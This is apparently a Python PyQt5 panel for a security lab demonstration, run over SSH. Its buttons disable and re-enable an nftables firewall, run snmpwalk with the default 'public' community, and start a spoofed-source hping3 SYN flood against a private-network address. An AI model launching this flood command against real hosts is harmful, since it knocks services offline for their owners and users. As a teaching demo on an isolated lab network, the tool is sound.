from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QDialog, QTextEdit, QDialogButtonBox, QSizePolicy,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal


class _SSHWorker(QThread):
    finished = pyqtSignal(str, str, int)  # stdout, stderr, returncode

    def __init__(self, tunnel_manager, remote_cmd, sudo=False):
        super().__init__()
        self._tm = tunnel_manager
        self._cmd = remote_cmd
        self._sudo = sudo

    def run(self):
        stdout, stderr, rc = self._tm.run_command(self._cmd, sudo=self._sudo)
        self.finished.emit(stdout, stderr, rc)


class _BackgroundStartWorker(QThread):
    finished = pyqtSignal(bool)  # success

    def __init__(self, tunnel_manager, remote_cmd):
        super().__init__()
        self._tm = tunnel_manager
        self._cmd = remote_cmd

    def run(self):
        ok = self._tm.start_background_command(self._cmd)
        self.finished.emit(ok)


class _BackgroundStopWorker(QThread):
    finished = pyqtSignal()

    def __init__(self, tunnel_manager, process_name):
        super().__init__()
        self._tm = tunnel_manager
        self._name = process_name

    def run(self):
        self._tm.stop_background_command(self._name)
        self.finished.emit()


class _OutputDialog(QDialog):
    def __init__(self, title, text, parent=None):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.resize(700, 500)
        self.setStyleSheet("background-color: #002855; color: white;")

        layout = QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(8)

        output = QTextEdit()
        output.setReadOnly(True)
        output.setPlainText(text)
        output.setStyleSheet(
            "background-color: #001533; color: #ccddff;"
            "font-family: Consolas, monospace; font-size: 12px;"
            "border: 1px solid #EAAA00; border-radius: 4px;"
        )
        layout.addWidget(output)

        btns = QDialogButtonBox(QDialogButtonBox.Close)
        btns.setStyleSheet(
            "QPushButton { background-color: #EAAA00; color: #002855;"
            " font-weight: bold; padding: 6px 20px; }"
        )
        btns.rejected.connect(self.accept)
        layout.addWidget(btns)


_BTN_STYLE_NORMAL = (
    "QPushButton {"
    "  background-color: #EAAA00; color: #002855;"
    "  font-size: 15px; font-weight: bold; border-radius: 6px;"
    "}"
    "QPushButton:hover { background-color: #ffc600; }"
    "QPushButton:disabled { background-color: #555; color: #999; }"
)

_BTN_STYLE_DANGER = (
    "QPushButton {"
    "  background-color: #cc2200; color: white;"
    "  font-size: 15px; font-weight: bold; border-radius: 6px;"
    "}"
    "QPushButton:hover { background-color: #ee3311; }"
    "QPushButton:disabled { background-color: #555; color: #999; }"
)


class DemonstrationView(QWidget):
    def __init__(self, tunnel_manager=None, user=None):
        super().__init__()
        self._tm = tunnel_manager
        self._firewall_enabled = True   # verified asynchronously on startup
        self._dos_running = False
        self._worker = None
        self._setup_ui()
        # Buttons stay disabled until the initial firewall state is confirmed
        self._set_buttons_enabled(False)
        self._run_async(
            "systemctl is-active nftables", sudo=False,
            callback=self._on_firewall_check_done,
        )

    # ── UI setup ──────────────────────────────────────────────────────────────

    def _setup_ui(self):
        outer = QVBoxLayout(self)
        outer.setContentsMargins(40, 40, 40, 40)
        outer.setSpacing(20)
        outer.setAlignment(Qt.AlignTop)

        title = QLabel("Demonstration")
        title.setStyleSheet("font-size: 22px; font-weight: bold; color: #EAAA00;")
        outer.addWidget(title)

        btn_row = QHBoxLayout()
        btn_row.setSpacing(20)
        btn_row.setAlignment(Qt.AlignLeft)

        self._fw_btn = QPushButton("Disable Firewall")
        self._fw_btn.setCursor(Qt.PointingHandCursor)
        self._fw_btn.setFixedSize(220, 50)
        self._fw_btn.setStyleSheet(_BTN_STYLE_NORMAL)
        self._fw_btn.clicked.connect(self._on_fw_btn_clicked)
        btn_row.addWidget(self._fw_btn)

        self._snmp_btn = QPushButton("Run snmpwalk")
        self._snmp_btn.setCursor(Qt.PointingHandCursor)
        self._snmp_btn.setFixedSize(220, 50)
        self._snmp_btn.setStyleSheet(_BTN_STYLE_NORMAL)
        self._snmp_btn.clicked.connect(self._on_snmp_btn_clicked)
        btn_row.addWidget(self._snmp_btn)

        self._dos_btn = QPushButton("Start DoS Attack")
        self._dos_btn.setCursor(Qt.PointingHandCursor)
        self._dos_btn.setFixedSize(220, 50)
        self._dos_btn.setStyleSheet(_BTN_STYLE_NORMAL)
        self._dos_btn.clicked.connect(self._on_dos_btn_clicked)
        btn_row.addWidget(self._dos_btn)

        outer.addLayout(btn_row)

        self._status_label = QLabel("")
        self._status_label.setStyleSheet("font-size: 13px; color: #99aacc;")
        outer.addWidget(self._status_label)

    def _update_fw_button(self):
        self._fw_btn.setText("Disable Firewall" if self._firewall_enabled else "Enable Firewall")

    def _update_dos_button(self):
        if self._dos_running:
            self._dos_btn.setText("Stop DoS Attack")
            self._dos_btn.setStyleSheet(_BTN_STYLE_DANGER)
        else:
            self._dos_btn.setText("Start DoS Attack")
            self._dos_btn.setStyleSheet(_BTN_STYLE_NORMAL)

    # ── Async helpers ─────────────────────────────────────────────────────────

    def _run_async(self, remote_cmd, sudo, callback):
        if self._tm is None:
            callback("", "No SSH connection", 1)
            return
        worker = _SSHWorker(self._tm, remote_cmd, sudo=sudo)
        worker.finished.connect(callback)
        worker.finished.connect(lambda *_: self._cleanup_worker(worker))
        self._worker = worker
        worker.start()

    def _run_background_start(self, remote_cmd, callback):
        if self._tm is None:
            callback(False)
            return
        worker = _BackgroundStartWorker(self._tm, remote_cmd)
        worker.finished.connect(callback)
        worker.finished.connect(lambda *_: self._cleanup_worker(worker))
        self._worker = worker
        worker.start()

    def _run_background_stop(self, process_name, callback):
        if self._tm is None:
            callback()
            return
        worker = _BackgroundStopWorker(self._tm, process_name)
        worker.finished.connect(callback)
        worker.finished.connect(lambda *_: self._cleanup_worker(worker))
        self._worker = worker
        worker.start()

    def _cleanup_worker(self, worker):
        worker.quit()
        worker.wait()
        if self._worker is worker:
            self._worker = None

    def _set_buttons_enabled(self, enabled):
        self._fw_btn.setEnabled(enabled)
        self._snmp_btn.setEnabled(enabled)
        self._dos_btn.setEnabled(enabled)

    # ── Firewall check (startup) ──────────────────────────────────────────────

    def _on_firewall_check_done(self, stdout, stderr, rc):
        self._firewall_enabled = (rc == 0)
        self._update_fw_button()
        self._set_buttons_enabled(True)

    # ── Firewall toggle ───────────────────────────────────────────────────────

    def _on_fw_btn_clicked(self):
        self._set_buttons_enabled(False)
        if self._firewall_enabled:
            cmd, msg = "systemctl stop nftables", "Disabling firewall…"
        else:
            cmd, msg = "systemctl start nftables", "Enabling firewall…"
        self._status_label.setText(msg)
        self._run_async(cmd, sudo=True, callback=self._on_fw_toggle_done)

    def _on_fw_toggle_done(self, stdout, stderr, rc):
        self._set_buttons_enabled(True)
        if rc == 0:
            self._firewall_enabled = not self._firewall_enabled
            self._update_fw_button()
            state = "enabled" if self._firewall_enabled else "disabled"
            self._status_label.setText(f"Firewall {state}.")
        else:
            self._status_label.setText(f"Error: {stderr or stdout or 'Unknown error'}")

    # ── snmpwalk ──────────────────────────────────────────────────────────────

    def _on_snmp_btn_clicked(self):
        self._set_buttons_enabled(False)
        self._status_label.setText("Running snmpwalk…")
        self._run_async(
            "snmpwalk -v2c -c public 192.168.1.51",
            sudo=False,
            callback=self._on_snmpwalk_done,
        )

    def _on_snmpwalk_done(self, stdout, stderr, rc):
        self._set_buttons_enabled(True)
        self._status_label.setText("")
        output = stdout or stderr or "(no output)"
        dlg = _OutputDialog("snmpwalk output", output, parent=self)
        dlg.exec_()

    # ── DoS attack ────────────────────────────────────────────────────────────

    # Kill any leftover instances first, then launch four parallel flood processes
    _DOS_CMD = (
        "sudo pkill -9 hping3 2>/dev/null; "
        "for i in 1 2 3 4; do "
        "nohup sudo hping3 -I wlan0 -S -d 1000 -q --flood --rand-source 192.168.1.2 "
        "> /dev/null 2>&1 & "
        "done"
    )

    def _on_dos_btn_clicked(self):
        self._set_buttons_enabled(False)
        if not self._dos_running:
            self._status_label.setText("Starting DoS attack…")
            self._run_background_start(
                self._DOS_CMD,
                callback=self._on_dos_started,
            )
        else:
            self._status_label.setText("Stopping DoS attack…")
            self._run_background_stop("hping3", callback=self._on_dos_stopped)

    def _on_dos_started(self, success):
        self._dos_running = success
        self._update_dos_button()
        self._set_buttons_enabled(True)
        self._status_label.setText(
            "DoS attack running." if success else "Failed to start DoS attack."
        )

    def _on_dos_stopped(self):
        self._dos_running = False
        self._update_dos_button()
        self._set_buttons_enabled(True)
        self._status_label.setText("DoS attack stopped.")

    # ── Called by MainWindow.closeEvent ──────────────────────────────────────

    def ensure_firewall_enabled(self):
        """Synchronously re-enable the firewall if it was disabled."""
        if not self._firewall_enabled and self._tm is not None:
            self._tm.run_command("systemctl start nftables", sudo=True)
            self._firewall_enabled = True

    def ensure_dos_stopped(self):
        """Synchronously stop the DoS attack if it is still running."""
        if self._dos_running and self._tm is not None:
            self._tm.stop_background_command("hping3")
            self._dos_running = False
